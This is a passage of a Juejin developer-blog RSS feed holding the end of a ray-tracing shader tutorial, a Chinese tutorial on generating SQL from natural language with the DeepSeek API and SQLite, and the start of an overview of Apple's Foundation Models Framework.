<span class="hljs-function">fragment vec4f <span class="hljs-title">fragmentFn</span><span class="hljs-params">(Vertex in [[stage_in]], constant Uniforms &amp;uniforms [[buffer(<span class="hljs-number">1</span>)]])</span> </span>{
  let origin = <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0</span>);
  let focus_distance = <span class="hljs-number">1.0</span>;
  let aspect_ratio = <span class="hljs-built_in">f32</span>(uniforms.width) / <span class="hljs-built_in">f32</span>(uniforms.height);
  var uv = in.position.xy / <span class="hljs-built_in">vec2f</span>(<span class="hljs-built_in">f32</span>(uniforms.width - <span class="hljs-number">1</span>), <span class="hljs-built_in">f32</span>(uniforms.height - <span class="hljs-number">1</span>));
  uv = (<span class="hljs-number">2</span> * uv - <span class="hljs-built_in">vec2f</span>(<span class="hljs-number">1</span>)) * <span class="hljs-built_in">vec2f</span>(aspect_ratio, <span class="hljs-number">-1</span>);
  let direction = <span class="hljs-built_in">vec3f</span>(uv, -focus_distance);
  let ray = Ray { origin, direction };
  var <span class="hljs-type">closest_t</span> = FLT_MAX;
  <span class="hljs-keyword">for</span> (u32 i = <span class="hljs-number">0</span>; i &lt; OBJECT_COUNT; ++i) {
    var t = <span class="hljs-built_in">intersect_sphere</span>(ray, scene[i]);
    <span class="hljs-keyword">if</span> (t &gt; <span class="hljs-number">0.</span> &amp;&amp; t &lt; <span class="hljs-type">closest_t</span>) {
      <span class="hljs-type">closest_t</span> = t;
    }
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-type">closest_t</span> &lt; FLT_MAX) {
<span class="hljs-comment">//    return vec4f(1, 0.76, 0.03, 1);</span>
<span class="hljs-comment">//    return vec4f(1, 0.76, 0.03, 1) * saturate(1. - closest_t);</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-built_in">saturate</span>(<span class="hljs-type">closest_t</span>) * <span class="hljs-number">0.5</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-built_in">sky_color</span>(ray), <span class="hljs-number">1</span>);
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 llm + SQLite 实现自然语言到 SQL 的智能转换：一个实战案例]]></title>    <link>https://juejin.cn/post/7575102209605926938</link>    <guid>https://juejin.cn/post/7575102209605926938</guid>    <pubDate>2025-11-23T06:33:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209605926938" data-draft-id="7575133880436097075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 llm + SQLite 实现自然语言到 SQL 的智能转换：一个实战案例"/> <meta itemprop="keywords" content="LLM,SQLite,Agent"/> <meta itemprop="datePublished" content="2025-11-23T06:33:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟袅"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 llm + SQLite 实现自然语言到 SQL 的智能转换：一个实战案例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟袅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:33:20.000Z" title="Sun Nov 23 2025 06:33:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常开发中，我们经常需要从数据库中查询数据。但对非技术人员来说，写 SQL 查询语句可能是个“噩梦”。而随着大模型的兴起，<strong>将自然语言直接转化为 SQL 查询</strong>已成为现实。</p>
<p>今天，我将结合 <strong>DeepSeek Reasoner 模型</strong> 和 <strong>SQLite 数据库</strong>，展示如何通过一段简单的 Python 代码，实现“<strong>你说中文，我出 SQL</strong>”的自动化能力。</p>
<hr/>
<h2 data-id="heading-0">🧩 项目目标</h2>
<p>给定一个简单的员工信息表，用户输入自然语言问题（如：“开发部门员工的姓名和工资是多少？”），程序自动解析并生成对应的 SQL 查询语句。</p>
<hr/>
<h2 data-id="heading-1">🔧 环境准备</h2>
<p>我们使用轻量级的 SQLite 数据库，并接入 DeepSeek 的 API 来完成自然语言理解与 SQL 生成任务。</p>
<h3 data-id="heading-2">1. 创建数据库表</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 打开链接</span>
conn = sqlite3.connect(<span class="hljs-string">"test.db"</span>)
cursor = conn.cursor()

cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees(
    id INTEGER PRIMARY KEY,
    name TEXT,
    department TEXT,
    salary INTEGER
)
"""</span>)
</code></pre>
<blockquote>
<p>✅ 这一步创建了一个名为 <code>employees</code> 的表，包含员工编号、姓名、部门和工资字段。</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">2. 插入测试数据</h3>
<pre><code class="hljs language-scss" lang="scss">sample_data = <span class="hljs-selector-attr">[    (6, <span class="hljs-string">"王五"</span>, <span class="hljs-string">"开发部"</span>, 32000),    (7, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"销售部"</span>, 20000),    (8, <span class="hljs-string">"老六"</span>, <span class="hljs-string">"开发部"</span>, 33000),    (9, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"销售部"</span>, 15000)]</span>

<span class="hljs-attribute">cursor</span><span class="hljs-selector-class">.executemany</span>("INSERT INTO employees VALUES(?,?,?,?)", sample_data)
conn<span class="hljs-selector-class">.commit</span>()
</code></pre>
<blockquote>
<p>💡 插入了4条测试数据，涵盖两个部门：开发部和销售部。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">3. 获取数据库 Schema</h3>
<p>为了让 LLM 理解表结构，我们需要把表的 schema 提供给模型：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 通过 table_info 拿到 employees 表的描述</span>
schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
schema_str = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"<span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"数据库Schema:"</span>)
<span class="hljs-built_in">print</span>(schema_str)
</code></pre>
<p>输出结果类似：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> EMPLOYEES (
id <span class="hljs-type">INTEGER</span>
name TEXT
department TEXT
salary <span class="hljs-type">INTEGER</span>
)
</code></pre>
<blockquote>
<p>📌 这个 schema 将作为上下文传给 DeepSeek 模型，帮助它理解字段含义。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">4. 调用 DeepSeek 生成 SQL</h3>
<p>现在，我们调用 DeepSeek 的 API，让模型根据自然语言生成 SQL 查询。</p>
<pre><code class="hljs language-ini" lang="ini">from openai import OpenAI

<span class="hljs-attr">client</span> = OpenAI(
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">''</span>,//这里写入自己的apikey
    <span class="hljs-attr">base_url</span>=<span class="hljs-string">'https://api.deepseek.com/v1'</span>
)

def ask_deepseek(query, schema):
    <span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""这是一个数据库的Schema:
{schema}
根据这个Schema，你能输出一个SQL查询来回答以下问题吗？
只输出SQL查询，不要输出任何内容，也不要带任何格式。
问题:{query}
"""</span>
    <span class="hljs-attr">response</span> = client.chat_completions.create(
        <span class="hljs-attr">model</span>=<span class="hljs-string">"deepseek-reasoner"</span>,
        <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">2048</span>,
        <span class="hljs-attr">messages</span>=[
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}
        ]
    )
    return response.choices<span class="hljs-section">[0]</span>.message.content

<span class="hljs-comment"># 示例提问</span>
<span class="hljs-attr">question</span> = <span class="hljs-string">"开发部门员工的姓名和工资是多少?"</span>
<span class="hljs-attr">sql</span> = ask_deepseek(question, schema_str)
print("生成的sql查询：")
print(sql)
</code></pre>
<hr/>
<h2 data-id="heading-6">✅ 预期输出</h2>
<p>运行上述代码后，你可能会得到如下 SQL 查询：</p>
<pre><code class="hljs language-ini" lang="ini">SELECT name, salary FROM employees WHERE <span class="hljs-attr">department</span> = <span class="hljs-string">'开发部'</span><span class="hljs-comment">;</span>
</code></pre>
<blockquote>
<p>🎉 完美！模型成功理解了“开发部门”对应的是 <code>department = '开发部'</code>，并返回了正确的字段选择。</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">🚀 技术亮点解析</h2>

























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>自然语言 → SQL</strong></td><td>利用 LLM 的理解能力，无需人工编写复杂查询</td></tr><tr><td><strong>Schema 上下文注入</strong></td><td>让模型知道表结构，避免误读字段名</td></tr><tr><td><strong>轻量级部署</strong></td><td>使用 SQLite，无需复杂数据库环境</td></tr><tr><td><strong>可扩展性强</strong></td><td>可轻松接入其他数据库或前端界面</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">🛠️ 应用场景建议</h2>
<ul>
<li><strong>低代码平台</strong>：让用户用自然语言查询数据</li>
<li><strong>内部报表工具</strong>：非技术人员也能快速获取数据</li>
<li><strong>教学辅助</strong>：帮助学生理解 SQL 逻辑</li>
<li><strong>自动化脚本</strong>：集成到工作流中，提升效率</li>
</ul>
<hr/>
<h2 data-id="heading-9">📌 总结</h2>
<p>通过本次实践，我们展示了如何利用 <strong>llm</strong>，结合 <strong>SQLite</strong> 数据库，构建一个简单却强大的“自然语言转 SQL”系统。整个流程清晰、易于复现，适合初学者上手，也具备实际应用价值。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Foundation Models Framework]]></title>    <link>https://juejin.cn/post/7575106644499169314</link>    <guid>https://juejin.cn/post/7575106644499169314</guid>    <pubDate>2025-11-23T07:53:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644499169314" data-draft-id="7575106644499136546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Foundation Models Framework"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2025-11-23T07:53:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="alloc"/> <meta itemprop="url" content="https://juejin.cn/user/923245496765566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Foundation Models Framework
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/923245496765566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    alloc
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:53:10.000Z" title="Sun Nov 23 2025 07:53:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读37分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🎯 第一部分：开场和Foundation Models简介</h2>
<h3 data-id="heading-1">1.1 为什么需要Foundation Models？</h3>
<h4 data-id="heading-2">业务痛点 vs 解决方案</h4>
<p>在相册业务中，我们经常遇到以下问题：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB  
    subgraph "传统方案痛点"  
        P1[搜索体验差&lt;br/&gt;难以用关键词找到照片]  
        P2[分类工作繁琐&lt;br/&gt;手动整理耗时耗力]  
        P3[内容理解不足&lt;br/&gt;无法自动理解照片]  
        P4[个性化推荐缺失&lt;br/&gt;难以推荐相关照片]  
    end  
      
    subgraph "Foundation Models解决方案"  
        S1[自然语言搜索&lt;br/&gt;去年夏天在海边的照片]  
        S2[智能分类&lt;br/&gt;自动组织照片]  
        S3[内容理解&lt;br/&gt;自动分析照片内容]  
        S4[智能推荐&lt;br/&gt;相似照片推荐]  
    end  
      
    P1 --&gt; S1  
    P2 --&gt; S2  
    P3 --&gt; S3  
    P4 --&gt; S4  
      
    style P1 fill:#FF3B30,color:#fff  
    style P2 fill:#FF3B30,color:#fff  
    style P3 fill:#FF3B30,color:#fff  
    style P4 fill:#FF3B30,color:#fff  
      
    style S1 fill:#34C759,color:#fff  
    style S2 fill:#34C759,color:#fff  
    style S3 fill:#34C759,color:#fff  
    style S4 fill:#34C759,color:#fff  
</code></pre>
<h3 data-id="heading-3">1.2 什么是Foundation Models Framework</h3>
<h4 data-id="heading-4">核心定义</h4>
<ul>
<li><strong>官方定义</strong>: Apple在iOS 18/macOS 15中引入的原生AI框架，是Apple Intelligence的核心组件</li>
<li><strong>技术定位</strong>: 让开发者轻松集成Apple Intelligence的大语言模型能力到应用中</li>
<li><strong>设计理念</strong>: <br/>
- 隐私优先：所有处理都在设备本地完成<br/>
- 开发者友好：简洁的API，易于集成<br/>
- 系统集成：与iOS/macOS深度集成</li>
</ul>
<h4 data-id="heading-5">Foundation Models vs 传统AI模型</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB  
    subgraph "传统AI方案"  
        T1[云端服务&lt;br/&gt;需要网络连接]  
        T2[数据上传&lt;br/&gt;需要上传到服务器]  
        T3[高延迟&lt;br/&gt;网络往返延迟]  
        T4[成本计费&lt;br/&gt;按使用量付费]  
        T5[API密钥&lt;br/&gt;需要密钥管理]  
        T6[隐私风险&lt;br/&gt;数据可能泄露]  
    end  
      
    subgraph "Foundation Models方案"  
        F1[设备端运行&lt;br/&gt;无需网络]  
        F2[数据本地化&lt;br/&gt;不出设备]  
        F3[低延迟&lt;br/&gt;本地处理]  
        F4[零成本&lt;br/&gt;Apple提供]  
        F5[无需密钥&lt;br/&gt;系统集成]  
        F6[隐私保护&lt;br/&gt;完全本地处理]  
    end  
      
    T1 -.对比.-&gt; F1  
    T2 -.对比.-&gt; F2  
    T3 -.对比.-&gt; F3  
    T4 -.对比.-&gt; F4  
    T5 -.对比.-&gt; F5  
    T6 -.对比.-&gt; F6  
      
    style T1 fill:#FF3B30,color:#fff  
    style T2 fill:#FF3B30,color:#fff  
    style T3 fill:#FF3B30,color:#fff  
    style T4 fill:#FF3B30,color:#fff  
    style T5 fill:#FF3B30,color:#fff  
    style T6 fill:#FF3B30,color:#fff  
      
    style F1 fill:#34C759,color:#fff  
    style F2 fill:#34C759,color:#fff  
    style F3 fill:#34C759,color:#fff  
    style F4 fill:#34C759,color:#fff  
    style F5 fill:#34C759,color:#fff  
    style F6 fill:#34C759,color:#fff  
</code></pre>
<p><strong>对比表格</strong>:</p>













































<table><thead><tr><th>特性</th><th>传统AI模型</th><th>Foundation Models</th></tr></thead><tbody><tr><td>部署方式</td><td>云端服务</td><td>设备端运行</td></tr><tr><td>网络要求</td><td>需要网络连接</td><td>无需网络</td></tr><tr><td>数据处理</td><td>数据上传到服务器</td><td>数据完全本地化</td></tr><tr><td>延迟</td><td>较高（网络往返）</td><td>低（本地处理）</td></tr><tr><td>成本</td><td>按使用量计费</td><td>零成本（Apple提供）</td></tr><tr><td>API密钥</td><td>需要管理</td><td>无需API密钥</td></tr><tr><td>隐私</td><td>数据可能泄露</td><td>完全隐私保护</td></tr></tbody></table>
<h4 data-id="heading-6">Apple Intelligence 架构概览</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB  
    subgraph "应用层"  
        App1[iOS App]  
        App2[macOS App]  
        App3[iPadOS App]  
    end  
      
    subgraph "Foundation Models Framework"  
        FM1[LanguageModelSession&lt;br/&gt;会话管理]  
        FM2[Tool Protocol&lt;br/&gt;工具协议]  
        FM3[Structured Generation&lt;br/&gt;结构化生成]  
        FM4[SystemLanguageModel&lt;br/&gt;系统语言模型]  
    end  
      
    subgraph "底层执行层"  
        CoreML[Core ML&lt;br/&gt;模型推理]  
        NeuralEngine[Neural Engine&lt;br/&gt;硬件加速]  
    end  
      
    subgraph "隐私和安全层"  
        Privacy[隐私保护&lt;br/&gt;设备端处理]  
        Security[数据加密&lt;br/&gt;安全存储]  
    end  
      
    App1 --&gt; FM1  
    App2 --&gt; FM1  
    App3 --&gt; FM1  
      
    FM1 --&gt; FM2  
    FM1 --&gt; FM3  
    FM1 --&gt; FM4  
      
    FM4 --&gt; CoreML  
    CoreML --&gt; NeuralEngine  
      
    NeuralEngine --&gt; Privacy  
    Privacy --&gt; Security  
      
    style FM1 fill:#007AFF,color:#fff  
    style FM2 fill:#007AFF,color:#fff  
    style FM3 fill:#007AFF,color:#fff  
    style FM4 fill:#007AFF,color:#fff  
    style CoreML fill:#34C759,color:#fff  
    style NeuralEngine fill:#34C759,color:#fff  
    style Privacy fill:#FF9500,color:#fff  
    style Security fill:#FF9500,color:#fff  
</code></pre>
<p><strong>关键组件说明</strong>:</p>
<ol>
<li><strong>LanguageModelSession</strong>: 会话管理，维护对话上下文</li>
<li><strong>SystemLanguageModel</strong>: 系统提供的语言模型</li>
<li><strong>Tool Protocol</strong>: 扩展模型能力，连接系统功能</li>
<li><strong>Structured Generation</strong>: 类型安全的数据生成</li>
</ol>
<h4 data-id="heading-7">核心能力概览</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((Foundation Models&lt;br/&gt;核心能力))  
    自然语言理解  
      理解用户查询  
      生成流畅响应  
      多轮对话  
      上下文维护  
    结构化数据生成  
      @Generable标记  
      类型安全  
      自动解析  
      易于集成  
    工具调用  
      Tool协议  
      系统功能连接  
      AI自动判断  
      多工具协调  
    流式响应  
      实时生成  
      提升体验  
      长文本支持  
